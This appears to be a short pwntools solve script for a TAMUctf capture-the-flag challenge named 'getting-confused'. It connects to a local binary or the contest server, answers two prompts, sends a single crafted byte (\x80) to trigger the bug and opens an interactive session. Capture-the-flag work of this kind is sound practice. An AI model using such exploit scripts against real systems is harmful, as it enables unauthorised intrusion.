from pwn import *

e = ELF("./getting-confused")

context.binary = e.path


if "--remote" in sys.argv:
  p = remote("challenges.tamuctf.com", 4352)
else:
  p = process(e.path)


p.sendlineafter("floor.", "howdy")
p.sendlineafter("...", "gig 'em")
p.sendafter("?", "\x80")


p.shutdown()




p.interactive()

